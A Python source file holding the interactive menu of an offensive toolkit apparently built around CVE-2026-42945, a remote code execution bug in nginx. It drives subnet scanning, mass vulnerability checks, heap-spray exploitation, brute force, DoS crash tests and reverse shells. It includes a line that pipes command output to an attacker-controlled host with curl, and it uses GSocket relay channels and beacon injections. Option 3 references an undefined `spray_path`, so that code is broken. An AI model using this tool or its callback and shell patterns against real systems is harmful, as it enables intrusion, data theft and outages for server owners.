"""
ui/tui.py — Interactive TUI (zero-dependency, stdlib only).
Covers: run_interactive, _ask, _confirm, _Spinner, colour helpers, BANNER
"""
from __future__ import annotations

import getpass
import json
import os
import sys
import threading
import time

from config import (
    BANNER, VERSION, DEFAULT_PORT, DEFAULT_HEAP_BASE, DEFAULT_LIBC_BASE,
    DEFAULT_SYSTEM_OFFSET, DEFAULT_HEAP_OFFSETS, KNOWN_BUILDS,
    GSRN_HOST, GSRN_PORT, _C2_AVAILABLE,
)
from ui.output import (
    _IS_TTY, _c, _RST, _BOLD, _DIM, _CYAN, _YLW, _GRN, _RED, _BLU, _MAG,
    log, _print_panel, _print_table,
)


# ─── TUI helpers ──────────────────────────────────────────────────────────────

def _ask(prompt: str, default: str = "",
         choices: list | None = None, password: bool = False) -> str:
    ch = f" [{'/'.join(choices)}]" if choices else ""
    df = f" ({default})" if default else ""
    full = f"{prompt}{ch}{df}: "
    while True:
        try:
            val = (getpass.getpass(full) if password else input(full)).strip() or default
        except (EOFError, KeyboardInterrupt):
            print()
            val = default
        if choices and val not in choices:
            print(f"  Choose one of: {', '.join(choices)}")
            continue
        return val


def _confirm(prompt: str, default: bool = False) -> bool:
    hint = "Y/n" if default else "y/N"
    while True:
        try:
            v = input(f"{prompt} [{hint}]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return default
        if not v:
            return default
        if v in ("y", "yes"):
            return True
        if v in ("n", "no"):
            return False


class _Spinner:
    _F = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"

    def __init__(self, msg: str = ""):
        self._msg = msg
        self._stop = threading.Event()
        self._t: threading.Thread | None = None

    def __enter__(self):
        if not _IS_TTY:
            print(f"[*] {self._msg}")
            return self
        self._t = threading.Thread(target=self._run, daemon=True)
        self._t.start()
        return self

    def __exit__(self, *_):
        self._stop.set()
        if self._t:
            self._t.join(0.3)
        if _IS_TTY:
            sys.stdout.write("\r" + " " * (len(self._msg) + 4) + "\r")
            sys.stdout.flush()

    def _run(self):
        i = 0
        while not self._stop.is_set():
            sys.stdout.write(f"\r{self._F[i % 10]} {self._msg}")
            sys.stdout.flush()
            time.sleep(0.1)
            i += 1


def _parse_target_tui(s: str):
    """Local parse_target for TUI (avoids circular import)."""
    use_ssl = False
    vhost = "localhost"
    if "://" in s:
        from urllib.parse import urlparse
        p = urlparse(s)
        host = p.hostname or s
        port = p.port or (443 if p.scheme == "https" else 80)
        use_ssl = (p.scheme == "https")
        vhost = host
        return host, port, vhost, use_ssl
    if ":" in s:
        h, _, p = s.partition(":")
        try:
            port = int(p)
            vhost = h
            use_ssl = (port == 443)
            return h, port, vhost, use_ssl
        except ValueError:
            return None
    vhost = s
    return s, DEFAULT_PORT, vhost, use_ssl


# ─── Interactive menu ─────────────────────────────────────────────────────────

def run_interactive():
    """Zero-dependency interactive menu — all 12 options."""
    from core.exploit import (
        mode_exploit, mode_check, mode_exploit_32, ExploitResult,
        CallbackState, _run_callback_listener, kill_port, run_shell_listener,
    )
    from core.spray import server_alive
    from core.payload import (
        build_reverse_shell_cmd, build_l2_payload, show_l2relay_panel,
    )
    from core.corruption import mode_realistic_exploit
    from recon.scanner import detect_service, scan_subnet, bulk_fingerprint_check, is_version_vulnerable
    from recon.nginx_config import detect_waf
    from recon.audit import audit_headers, tls_audit
    from recon.endpoints import path_discovery
    from c2.methods import GSocketCallbackReceiver, start_gsocket_l1_listener, forward_gsocket_shell
    from patch.apply import patch_server
    from automation.auto import auto_scan, auto_patch, auto_exploit
    from modes.probe import mode_probe_cmd, mode_curl_only
    from modes.listen import mode_listen_only
    from modes.dos import mode_dos
    from ui.output import generate_html_scan_report, generate_json_report, print_scan_results

    def _clr():
        os.system("clear 2>/dev/null || cls 2>/dev/null")

    _clr()
    print(_CYAN + _BOLD + BANNER + _RST)
    print(f"{_DIM}Interactive Super Toolkit — CVE-2026-42945  v{VERSION}{_RST}\n")

    while True:
        _print_panel(
            f"{_GRN}[1]{_RST}  Scan Network (subnet discovery)\n"
            f"{_GRN}[2]{_RST}  Check Target (fingerprint + vuln check)\n"
            f"{_GRN}[3]{_RST}  Exploit Target (RCE via heap spray)\n"
            f"{_YLW}[4]{_RST}  32-bit Brute Force (callback RCE)\n"
            f"{_YLW}[5]{_RST}  Patch Target (SSH remote patch)\n"
            f"{_CYAN}[6]{_RST}  Web Audit (headers, paths, TLS)\n"
            f"{_CYAN}[7]{_RST}  CIDR Auto-Scan → Report\n"
            f"{_RED}[8]{_RST}  DoS Test (crash verification)\n"
            f"{_BLU}[9]{_RST}  Generate Report (HTML/JSON)\n"
            f"{_BLU}[10]{_RST} Bulk Fingerprint + Vuln Check (target list)\n"
            f"{_GRN}[11]{_RST} Probe Command (curl/wget beacon → confirm RCE)\n"
            f"{_GRN}[12]{_RST} Curl Only — basic RCE to URL (no listener)\n"
            f"{_DIM}[0]{_RST}  Exit",
            title="Menu",
        )

        choice = _ask(
            "Select",
            choices=["0","1","2","3","4","5","6","7","8","9","10","11","12"],
        )

        if choice == "0":
            print(f"{_YLW}Goodbye!{_RST}")
            break

        # ── [1] Subnet Scan ─────────────────────────────────────────────────
        elif choice == "1":
            subnet = _ask("CIDR subnet", default="192.168.1.0/24")
            port = int(_ask("Port", default=str(DEFAULT_PORT)))
            with _Spinner("Scanning..."):
                hosts = scan_subnet(subnet, port)
            if hosts:
                _print_table(
                    ["#", "Host"],
                    [[str(i), h] for i, h in enumerate(hosts, 1)],
                    title=f"Live hosts on port {port}",
                )
            else:
                print(f"{_YLW}No live hosts found.{_RST}")
            input("\nPress Enter to continue...")
            _clr()

        # ── [2] Check Target ────────────────────────────────────────────────
        elif choice == "2":
            target = _ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = _parse_target_tui(target)
            if not parsed:
                print(f"{_RED}Invalid target{_RST}")
                input("\nPress Enter to continue...")
                _clr()
                continue
            host, port, vhost, use_ssl = parsed
            with _Spinner("Checking..."):
                check = mode_check(host, port, vhost=vhost, use_ssl=use_ssl)
                svc = detect_service(host, port, vhost=vhost, use_ssl=use_ssl)
                waf = detect_waf(host, port, vhost=vhost, use_ssl=use_ssl)
            _print_panel(json.dumps(check, indent=2)[:1000], title="Check Result")
            print(f"{_GRN}Server:{_RST} {svc.get('server', '?')}")
            if svc.get("redirect"):
                print(f"{_YLW}Redirect detected:{_RST} {svc['redirect']}")
            if waf:
                print(f"{_RED}WAF detected: {', '.join(waf)}{_RST}")
            input("\nPress Enter to continue...")
            _clr()

        # ── [3] Exploit Target ──────────────────────────────────────────────
        elif choice == "3":
            target = _ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = _parse_target_tui(target)
            if not parsed:
                print(f"{_RED}Invalid target{_RST}")
                input("\nPress Enter to continue...")
                _clr()
                continue
            host, port, vhost, use_ssl = parsed

            use_shell = _confirm("Use reverse shell?", default=False)
            gs_receiver = None
            cb_state = None
            lport = 1337

            if use_shell:
                shell_mode = _ask("Shell mode", choices=["direct", "l2relay"], default="direct")
                if shell_mode == "l2relay":
                    l2_ip = _ask("L2 Relay IP")
                    l2_port = int(_ask("L2 Relay Port", default="12345"))
                    l1_tok = _ask("L1 GSocket Token (blank=auto)", default="")
                    l2_sec = _ask("L2 Local Secret (blank=placeholder)", default="")
                    if not l1_tok:
                        import secrets as _sec
                        l1_tok = _sec.token_hex(16)
                    cmd = build_l2_payload(l2_ip, l2_port)
                    show_l2relay_panel(l2_ip, l2_port, l1_tok, l2_sec, cmd)
                    l1_proc = start_gsocket_l1_listener(l1_tok)
                    if l1_proc:
                        print(f"{_GRN}L1 listener started{_RST}")
                    input(f"{_DIM}Press Enter when L2 bridge is running...{_RST}")
                else:
                    lhost = _ask("Your IP", default="172.17.0.1")
                    lport = int(_ask("Listener port", default="1337"))
                    cmd = build_reverse_shell_cmd(lhost, lport)
            else:
                cmd = _ask("Command", default="id")
                cb_method = _ask("Capture output via",
                                 choices=["none", "gsocket", "http"], default="none")
                if cb_method == "gsocket":
                    gs_secret = _ask("GSocket secret (blank=auto)", default="")
                    gs_relay = _ask("GSRN relay", default=f"{GSRN_HOST}:{GSRN_PORT}")
                    _rh, _, _rp = gs_relay.partition(":")
                    gs_receiver = GSocketCallbackReceiver(
                        gs_secret or None, _rh, int(_rp) if _rp else GSRN_PORT
                    )
                    if gs_receiver.start():
                        print(f"{_GRN}GSRN ready{_RST}  secret={gs_receiver.secret}")
                        cmd = gs_receiver.target_cmd(cmd)
                    else:
                        gs_receiver = None
                elif cb_method == "http":
                    cb_ip = _ask("Your IP (reachable from target)", default="172.17.0.1")
                    cb_port = int(_ask("Callback port", default="9876"))
                    cb_state = CallbackState()
                    cb_ready = threading.Event()
                    threading.Thread(
                        target=_run_callback_listener,
                        args=("0.0.0.0", cb_port, cb_state, cb_ready),
                        daemon=True,
                    ).start()
                    cb_ready.wait(5)
                    cmd = f"{cmd} | curl -sm5 -d @- http://{cb_ip}:{cb_port}/rce"

            kb_name = _ask("Known build preset (blank = default)", default="")
            hb = DEFAULT_HEAP_BASE
            lb = DEFAULT_LIBC_BASE
            so = DEFAULT_SYSTEM_OFFSET
            offs = DEFAULT_HEAP_OFFSETS
            if kb_name and kb_name in KNOWN_BUILDS:
                kb = KNOWN_BUILDS[kb_name]
                hb, lb, so, offs = kb["heap_base"], kb["libc_base"], kb["sys_offset"], kb["offsets"]
                log(f"Using known build '{kb_name}'", "info")

            tries = int(_ask("Tries per offset", default="10"))

            if use_shell:
                t = threading.Thread(target=run_shell_listener, args=(lport,), daemon=True)
                t.start()
                time.sleep(0.5)

            with _Spinner("Exploiting..."):
                result = mode_exploit(host, port, cmd, hb, lb, so, offs, tries,
                                     vhost=vhost, use_ssl=use_ssl,
                                     spray_path=spray_path if spray_path else None)

            if result.success:
                print(f"\n{_GRN}{_BOLD}[+] Exploit triggered!{_RST}  addr={result.winning_addr}")
                if gs_receiver:
                    print(f"{_DIM}Waiting for GSocket output...{_RST}")
                    out = gs_receiver.wait(30)
                    if out:
                        _print_panel(out[:2000], title="Command Output")
                    gs_receiver.stop()
                elif cb_state:
                    print(f"{_DIM}Waiting for HTTP callback...{_RST}")
                    if cb_state.event.wait(30):
                        _print_panel(str(cb_state.output)[:2000], title="Command Output")
                if use_shell:
                    print(f"\n{_GRN}Shell listener active on port {lport}...{_RST}")
                    input("Press Enter to return to menu (shell runs in background)...")
            else:
                print(f"\n{_RED}[-] Exploit failed: {result.error or 'no crash detected'}{_RST}")

            input("\nPress Enter to continue...")
            _clr()

        # ── [4] 32-bit Brute Force ──────────────────────────────────────────
        elif choice == "4":
            target = _ask("Target (host:port)", default=f"127.0.0.1:19331")
            parsed = _parse_target_tui(target)
            if not parsed:
                print(f"{_RED}Invalid target{_RST}")
                input("\nPress Enter to continue...")
                _clr()
                continue
            host, port, vhost, use_ssl = parsed
            cb_ip = _ask("Callback IP (your IP)", default="172.17.0.1")
            cb_port = int(_ask("Callback port", default="9876"))
            cmd = _ask("Command", default="id")
            from config import (
                DEFAULT_HEAP_PAGE_MIN, DEFAULT_HEAP_PAGE_MAX,
                DEFAULT_LIBC_PAGE_MIN, DEFAULT_LIBC_PAGE_MAX,
                DEFAULT_SPRAY_INTERNAL_OFF_32, DEFAULT_N_PLUS_32,
                DEFAULT_SYSTEM_OFF_32,
            )
            with _Spinner("Brute-forcing (this may take a while)..."):
                result = mode_exploit_32(
                    host, port, cmd, cb_ip, cb_port,
                    DEFAULT_HEAP_PAGE_MIN, DEFAULT_HEAP_PAGE_MAX,
                    DEFAULT_LIBC_PAGE_MIN, DEFAULT_LIBC_PAGE_MAX,
                    DEFAULT_SYSTEM_OFF_32, DEFAULT_SPRAY_INTERNAL_OFF_32,
                    DEFAULT_N_PLUS_32, vhost=vhost, use_ssl=use_ssl,
                )
            if result.get("success"):
                print(f"\n{_GRN}{_BOLD}[+] RCE CONFIRMED!{_RST}")
                print(f"  Output: {result.get('output')}")
            else:
                print(f"\n{_RED}[-] Brute-force exhausted ({result.get('attempts_tried', 0)} tries){_RST}")
            input("\nPress Enter to continue...")
            _clr()

        # ── [5] Patch Target ────────────────────────────────────────────────
        elif choice == "5":
            target = _ask("Target host (no port needed for SSH)", default="127.0.0.1")
            ssh_port = int(_ask("SSH port", default="22"))
            user = _ask("SSH user", default="root")
            auth = _ask("Auth method", choices=["password", "key"], default="password")
            password = None
            key_path = None
            if auth == "password":
                password = _ask("SSH password", password=True)
            else:
                key_path = _ask("Key path", default="~/.ssh/id_rsa")
            dry = _confirm("Dry run?", default=True)
            with _Spinner("Patching..."):
                result = patch_server(target, ssh_port, user, password, key_path, dry_run=dry)
            _print_panel(json.dumps(result, indent=2)[:1000], title="Patch Result")
            input("\nPress Enter to continue...")
            _clr()

        # ── [6] Web Audit ───────────────────────────────────────────────────
        elif choice == "6":
            target = _ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = _parse_target_tui(target)
            if not parsed:
                print(f"{_RED}Invalid target{_RST}")
                input("\nPress Enter to continue...")
                _clr()
                continue
            host, port, vhost, use_ssl = parsed
            with _Spinner("Auditing..."):
                hdrs = audit_headers(host, port, vhost=vhost, use_ssl=use_ssl)
                paths = path_discovery(host, port, vhost=vhost, use_ssl=use_ssl)
                tls = tls_audit(host, port, vhost=vhost)
                waf = detect_waf(host, port, vhost=vhost, use_ssl=use_ssl)
            print(f"\n{_BOLD}Security Headers:{_RST}")
            for hdr, info in hdrs.items():
                if isinstance(info, dict):
                    status = f"{_GRN}OK{_RST}" if info.get("present") else f"{_RED}MISSING{_RST}"
                    print(f"  {hdr:35s} {status}")
            print(f"\n{_BOLD}TLS Support:{_RST}")
            for ver, ok in tls.items():
                status = f"{_GRN}YES{_RST}" if ok else f"{_DIM}no{_RST}"
                print(f"  {ver:10s} {status}")
            if waf:
                print(f"\n{_RED}WAF detected: {', '.join(waf)}{_RST}")
            print(f"\n{_BOLD}Interesting Paths:{_RST}")
            for p_info in paths.get("paths_found", [])[:20]:
                print(f"  {p_info['path']:35s} {p_info['status'][:40]}")
            input("\nPress Enter to continue...")
            _clr()

        # ── [7] CIDR Auto-Scan ──────────────────────────────────────────────
        elif choice == "7":
            subnet = _ask("CIDR subnet", default="192.168.1.0/24")
            port = int(_ask("Port", default=str(DEFAULT_PORT)))
            out_file = _ask("Output file (blank=none)", default="")
            with _Spinner("Auto-scanning..."):
                results = auto_scan(subnet, port, output=out_file or None)
            print_scan_results(results)
            input("\nPress Enter to continue...")
            _clr()

        # ── [8] DoS Test ────────────────────────────────────────────────────
        elif choice == "8":
            target = _ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = _parse_target_tui(target)
            if not parsed:
                print(f"{_RED}Invalid target{_RST}")
                input("\nPress Enter to continue...")
                _clr()
                continue
            host, port, vhost, use_ssl = parsed
            overflow = int(_ask("Overflow size", default="200"))
            if not _confirm("Fire DoS test?", default=False):
                input("\nPress Enter to continue...")
                _clr()
                continue
            with _Spinner("Testing DoS..."):
                result = mode_dos(host, port, overflow, vhost=vhost, use_ssl=use_ssl)
            if result.get("vulnerable"):
                print(f"\n{_RED}{_BOLD}[!] TARGET IS VULNERABLE (worker crashed and recovered){_RST}")
            elif result.get("crashed"):
                print(f"\n{_YLW}[!] Worker crashed but server did not recover (may already be patched){_RST}")
            else:
                print(f"\n{_GRN}[-] No crash detected{_RST}")
            input("\nPress Enter to continue...")
            _clr()

        # ── [9] Generate Report ─────────────────────────────────────────────
        elif choice == "9":
            file_path = _ask("Output file path (.html or .json)", default="report.html")
            sample = [{"host": "127.0.0.1", "nginx_version": "1.25.3",
                       "vulnerable": True, "server": "nginx/1.25.3"}]
            if file_path.endswith(".json"):
                generate_json_report({"results": sample}, file_path)
            else:
                generate_html_scan_report(sample, file_path)
            print(f"{_GRN}Report written to {file_path}{_RST}")
            input("\nPress Enter to continue...")
            _clr()

        # ── [10] Bulk Fingerprint ────────────────────────────────────────────
        elif choice == "10":
            tfile = _ask("Target list file (one per line)", default="targets.txt")
            try:
                with open(tfile) as f:
                    targets = f.readlines()
            except OSError as e:
                print(f"{_RED}Cannot open {tfile}: {e}{_RST}")
                input("\nPress Enter to continue...")
                _clr()
                continue
            out_file = _ask("Output file (blank=none)", default="")
            with _Spinner(f"Checking {len(targets)} targets..."):
                bulk_fingerprint_check(targets, output=out_file or None)
            input("\nPress Enter to continue...")
            _clr()

        # ── [11] Probe Command ───────────────────────────────────────────────
        elif choice == "11":
            target = _ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = _parse_target_tui(target)
            if not parsed:
                print(f"{_RED}Invalid target{_RST}")
                input("\nPress Enter to continue...")
                _clr()
                continue
            host, port, vhost, use_ssl = parsed
            cb_host = _ask("Beacon callback IP (your IP)", default="192.168.140.101")
            cb_port = int(_ask("Beacon callback port", default="8006"))
            cb_path = _ask("Beacon URL path", default="/ping")
            kb_name = _ask("Known build preset (blank=default)", default="")
            hb = DEFAULT_HEAP_BASE
            lb = DEFAULT_LIBC_BASE
            so = DEFAULT_SYSTEM_OFFSET
            offs = DEFAULT_HEAP_OFFSETS
            if kb_name and kb_name in KNOWN_BUILDS:
                kb = KNOWN_BUILDS[kb_name]
                hb, lb, so, offs = kb["heap_base"], kb["libc_base"], kb["sys_offset"], kb["offsets"]
            tries = int(_ask("Tries per offset", default="10"))
            spray_path = _ask("Spray path (blank=auto-discover)", default="")
            if spray_path == "":
                spray_path = None
            _print_panel(
                f"  Target : {host}:{port}\n"
                f"  Beacon : http://{cb_host}:{cb_port}{cb_path}\n"
                f"  Inject : curl -sm3 ... || wget -q ...\n",
                title="Probe Mode",
            )
            if not _confirm("Fire probe?", default=True):
                input("\nPress Enter to continue...")
                _clr()
                continue
            with _Spinner("Probing..."):
                result = mode_probe_cmd(
                    host, port, cb_host=cb_host, cb_port=cb_port, cb_path=cb_path,
                    heap_base=hb, libc_base=lb, system_off=so, offsets=offs,
                    tries=tries, vhost=vhost, use_ssl=use_ssl,
                    spray_path=spray_path,
                )
            if result.get("hit"):
                print(f"\n{_GRN}{_BOLD}[+] RCE CONFIRMED — beacon received!{_RST}")
                print(f"  Beacon : {result['cb_url']}")
                print(f"  Detail : {result.get('callback_detail')}")
                print(f"  Address: {result.get('winning_addr')}")
            elif result.get("exploit_success"):
                print(f"\n{_YLW}[!] Exploit triggered but no beacon received.{_RST}")
                print(f"  Check network path: target → {cb_host}:{cb_port}")
            else:
                print(f"\n{_RED}[-] Probe failed: {result.get('error') or 'no crash'}{_RST}")
            input("\nPress Enter to continue...")
            _clr()

        # ── [12] Curl Only ───────────────────────────────────────────────────
        elif choice == "12":
            target = _ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = _parse_target_tui(target)
            if not parsed:
                print(f"{_RED}Invalid target{_RST}")
                input("\nPress Enter to continue...")
                _clr()
                continue
            host, port, vhost, use_ssl = parsed
            curl_url = _ask("Curl target URL", default="https://webhook.site/your-uuid")
            _print_panel(
                f"  Target : {host}:{port}\n"
                f"  Curl   : curl -sm3 {curl_url}\n"
                f"\n"
                f"  Inject curl command directly — no local listener.\n",
                title="Curl-Only RCE",
            )
            if not _confirm("Fire exploit?", default=True):
                input("\nPress Enter to continue...")
                _clr()
                continue
            kb_name = _ask("Known build preset (blank=default)", default="")
            hb = DEFAULT_HEAP_BASE
            lb = DEFAULT_LIBC_BASE
            so = DEFAULT_SYSTEM_OFFSET
            offs = DEFAULT_HEAP_OFFSETS
            if kb_name and kb_name in KNOWN_BUILDS:
                kb = KNOWN_BUILDS[kb_name]
                hb, lb, so, offs = kb["heap_base"], kb["libc_base"], kb["sys_offset"], kb["offsets"]
            tries = int(_ask("Tries per offset", default="10"))
            spray_path = _ask("Spray path (blank=auto-discover)", default="")
            if spray_path == "":
                spray_path = None
            with _Spinner("Exploiting..."):
                result = mode_curl_only(
                    host, port, curl_url,
                    heap_base=hb, libc_base=lb, system_off=so,
                    offsets=offs, tries=tries,
                    vhost=vhost, use_ssl=use_ssl,
                    spray_path=spray_path,
                )
            if result.get("success"):
                print(f"\n{_GRN}{_BOLD}[+] RCE triggered!{_RST}")
                print(f"  Command : curl -sm3 {curl_url}")
                print(f"  Address : {result.get('winning_addr')}")
                print(f"  Check your HTTP server for incoming request.")
            else:
                print(f"\n{_RED}[-] Exploit failed: {result.get('error') or 'no crash detected'}{_RST}")
            input("\nPress Enter to continue...")
            _clr()

        else:
            print(f"{_YLW}Unknown choice.{_RST}")
            input("\nPress Enter to continue...")
            _clr()
